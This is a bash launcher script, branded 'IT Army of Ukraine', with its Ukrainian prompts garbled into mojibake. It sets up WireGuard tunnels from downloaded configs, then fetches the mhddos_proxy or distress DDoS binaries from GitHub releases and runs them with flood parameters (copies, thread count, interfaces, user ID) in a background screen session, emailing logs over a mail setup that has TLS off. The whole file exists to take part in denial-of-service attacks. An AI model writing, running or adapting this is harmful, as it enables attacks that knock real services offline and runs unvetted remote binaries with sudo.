#!/bin/bash
set -e

# === ASCII-–õ–û–ì–û–¢–ò–ü IT ARMY OF UA ===
echo -e "\e[1;33m"
cat << "EOF"
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                        ‚ïë
‚ïë   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó     ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó                 ‚ïë
‚ïë   ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù                 ‚ïë
‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù                  ‚ïë
‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë  ‚ïö‚ñà‚ñà‚ïî‚ïù                   ‚ïë
‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë                    ‚ïë
‚ïë   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù       ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù                    ‚ïë
‚ïë                                                                        ‚ïë
‚ïë                   üíª  I T   A R M Y   O F   U K R A I N E              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
EOF
echo -e "\e[0m"

# === –ó–ú–Ü–ù–ù–Ü ===
SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
mkdir -p "$LOG_DIR"
touch "$LOG_FILE"

# === –õ–û–ì–£–í–ê–ù–ù–Ø ===
log() {
    MSG="[$(date +'%Y-%m-%d %H:%M:%S')] $1"
    echo -e "\e[1;36m[LOG] $MSG\e[0m"
    echo "$MSG" >> "$LOG_FILE"
}

# === EMAIL-–ö–û–ù–§–Ü–ì ===
echo "–í–≤–µ–¥—ñ—Ç—å email –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ª–æ–≥—ñ–≤ (–∞–±–æ –∑–∞–ª–∏—à—Ç–µ –ø–æ—Ä–æ–∂–Ω—ñ–º):"
read EMAIL_TARGET
if [[ "$EMAIL_TARGET" =~ ^.+@.+\..+$ ]]; then
  echo "EMAIL=\"$EMAIL_TARGET\"" >> "$SETTINGS_FILE"
  echo -e "defaults\nauth on\ntls off\nlogfile ~/.msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" > ~/.msmtprc
  chmod 600 ~/.msmtprc
fi

# === –§–£–ù–ö–¶–Ü–á GUI/CLI ===
ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="–í–≤–µ–¥–µ–Ω–Ω—è USER-ID" --text="–í–≤–µ–¥—ñ—Ç—å –≤–∞—à user-id (—Ç—ñ–ª—å–∫–∏ —Ü–∏—Ñ—Ä–∏):" --width=400)
    else
        read -p "–í–≤–µ–¥—ñ—Ç—å –≤–∞—à user-id (—Ç—ñ–ª—å–∫–∏ —Ü–∏—Ñ—Ä–∏): " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è" \
            --text="–í–∫–∞–∂—ñ—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø—É—Å–∫—É" \
            --add-combo="–ú–æ–¥—É–ª—å" --combo-values="mhddos_proxy|distress" \
            --add-combo="–†–µ–¥–∞–≥—É–≤–∞—Ç–∏ INI –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º?" --combo-values="–¢–∞–∫|–ù—ñ" \
            --add-combo="–†–µ–∂–∏–º –∑–∞–ø—É—Å–∫—É" --combo-values="screen —É —Ñ–æ–Ω—ñ|screen –≤—ñ–¥–∫—Ä–∏—Ç–æ|–±–µ–∑ screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "–ó–∞–ø—É—Å–∫ —Å–∫–∞—Å–æ–≤–∞–Ω–æ"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "–í–∏–±–µ—Ä—ñ—Ç—å –º–æ–¥—É–ª—å:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
        echo "–†–µ–¥–∞–≥—É–≤–∞—Ç–∏ INI –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º?"
        echo "1) –¢–∞–∫"
        echo "2) –ù—ñ"
        read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "–¢–∞–∫" || echo "–ù—ñ" )
        echo "–í–∏–±–µ—Ä—ñ—Ç—å —Ä–µ–∂–∏–º –∑–∞–ø—É—Å–∫—É:"
        echo "1) screen —É —Ñ–æ–Ω—ñ"
        echo "2) screen –≤—ñ–¥–∫—Ä–∏—Ç–æ"
        echo "3) –±–µ–∑ screen"
        read -p "–í–∞—à –≤–∏–±—ñ—Ä (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen —É —Ñ–æ–Ω—ñ";;
            2) SELECTED_RUN_MODE="screen –≤—ñ–¥–∫—Ä–∏—Ç–æ";;
            3) SELECTED_RUN_MODE="–±–µ–∑ screen";;
        esac
    fi
}

# === –ó–ê–ü–ò–¢ –ù–ê–õ–ê–®–¢–£–í–ê–ù–¨ ===
if [ -f "$SETTINGS_FILE" ]; then source "$SETTINGS_FILE"; fi
if [ -z "$USER_ID" ]; then while true; do ask_user_id; [[ "$USER_ID" =~ ^[0-9]+$ ]] && break; done; fi
if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then ask_run_parameters; fi

# === –ü–ï–†–ï–í–Ü–†–ö–ê SUDO ===
if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO=$(command -v sudo || echo ""); fi
[ -z "$SUDO" ] && { echo "–ü–æ—Ç—Ä—ñ–±–µ–Ω sudo."; exit 1; }

# === –í–°–¢–ê–ù–û–í–õ–ï–ù–ù–Ø –ó–ê–õ–ï–ñ–ù–û–°–¢–ï–ô ===
$SUDO apt update -y
$SUDO apt install -y curl wget git screen sed wireguard msmtp zenity

# === –ó–ê–í–ê–ù–¢–ê–ñ–ï–ù–ù–Ø WG-–ö–û–ù–§–Ü–ì–Ü–í ===
WG_DIR="$HOME/wg_confs"
mkdir -p "$WG_DIR"
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=\").*?\\.conf(?=\")' | grep '/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
for url in $CONF_LIST; do wget -qO "$WG_DIR/$(basename $url)" "$url"; done
log "–ö–æ–Ω—Ñ—ñ–≥–∏ WireGuard –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ"

# === –ü–Ü–î–ö–õ–Æ–ß–ï–ù–ù–Ø –¢–£–ù–ï–õ–Ü–í ===
INTERFACES=()
for conf in $(find "$WG_DIR" -name '*.conf' | shuf | head -n 4); do
    IFACE_NAME=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf" && INTERFACES+=("$IFACE_NAME")
    sleep 1
    log "–ü—ñ–¥–∫–ª—é—á–µ–Ω–æ $IFACE_NAME"
done

# === –í–°–¢–ê–ù–û–í–õ–ï–ù–ù–Ø –ú–û–î–£–õ–Ø ===
MODULE_DIR="$HOME/modules"
mkdir -p "$MODULE_DIR"
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_URL="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac
wget -qO "$MODULE" "$MODULE_URL"
chmod +x "$MODULE"

# === –°–¢–í–û–†–ï–ù–ù–Ø INI ===
INTERFACES_CSV=$(IFS=','; echo "${INTERFACES[*]}")
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" > "$CONFIG_FILE"
log "INI —Å—Ç–≤–æ—Ä–µ–Ω–æ: $CONFIG_FILE"

# === –†–ï–î–ê–ì–£–í–ê–ù–ù–Ø INI ===
[ "$EDIT_INI" = "–¢–∞–∫" ] && { [ -n "$DISPLAY" ] && zenity --text-info --editable --filename="$CONFIG_FILE" || nano "$CONFIG_FILE"; }

# === –ó–ê–ü–£–°–ö –£ SCREEN ===
case "$SELECTED_RUN_MODE" in
    "screen —É —Ñ–æ–Ω—ñ") screen -dmS "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;; 
    "screen –≤—ñ–¥–∫—Ä–∏—Ç–æ") screen -S "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "–±–µ–∑ screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac
log "–ú–æ–¥—É–ª—å $SELECTED_MODULE –∑–∞–ø—É—â–µ–Ω–æ"

# === –í–Ü–î–ü–†–ê–í–ö–ê –õ–û–ì–£ ===
if [ -n "$EMAIL_TARGET" ]; then
  echo -e "\n===== Kaljan747 –õ–æ–≥ =====\n" | cat - "$LOG_FILE" | msmtp "$EMAIL_TARGET"
  log "–ó–≤—ñ—Ç –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ $EMAIL_TARGET"
fi

log "–ì–æ—Ç–æ–≤–æ. –°–ª—ñ–¥–∫—É–π—Ç–µ –∑–∞ –ª–æ–≥–æ–º: $LOG_FILE"
